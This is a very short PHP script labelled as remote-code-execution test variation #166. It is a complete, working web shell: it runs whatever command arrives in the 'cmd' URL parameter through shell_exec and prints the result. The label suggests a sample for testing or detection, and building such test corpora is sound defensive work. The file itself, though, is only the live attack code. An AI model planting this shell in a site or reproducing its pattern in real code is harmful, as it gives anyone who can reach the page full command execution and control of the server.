<?php
// RCE test variation #166
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>